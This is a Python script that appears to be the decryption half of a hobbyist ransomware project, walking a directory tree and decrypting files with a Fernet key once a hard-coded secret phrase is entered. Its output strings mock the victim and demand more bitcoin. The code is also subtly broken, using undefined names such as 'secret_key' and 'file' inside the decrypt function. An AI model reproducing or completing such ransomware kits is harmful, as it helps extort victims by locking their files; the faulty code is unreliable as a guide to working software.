
import os 
from cryptography.fernet import Fernet
# This file does the opposite of ENCRYPTING




def decrypt_file(file_path, secret_key):
	with open(file, "rb") as thefile:
		contents = thefile.read()
	contents_decrypted = Fernet(secretkey).decrypt(contents)
	with open(file, "wb") as thefile:
		thefile.write(contents_decrypted)
#lets find some files 



files = []

for file in os.listdir():
	if file == "encrypt.py" or file == "thekey.key" or file == "decrypt.py":	#if file  is encrypt.py, thekey.key or decrypt.key then dont add
		continue
	if os.path.isfile(file):	#iff it is a file add it to the list
		files.append(file)

print(files)

# loading secret key
with open("thekey.key","rb") as key:
	secretkey = key.read()

secretphrase = "coffee"
user_phrase = input("Enter the secret phrase to decrypt your files\n")

if user_phrase == secretphrase:
# this loop will go through each file in the files list and DECRYPT each one with the key	
	for root, dirs, files in os.walk('.'):
		for file in files:
			# skipping files we dont want to decrypt
			if file == 'encrypt.py' or file == 'decrypt.py' or file == 'thekey.key':
				continue
			# getting file path
			file_path = os.path.join(root, file)
			# decryption
			decrypt_file(file_path, secret_key)

	print("Thanks sucka")
else: 
	print("WRONG!, SEND MORE BITCOIN")
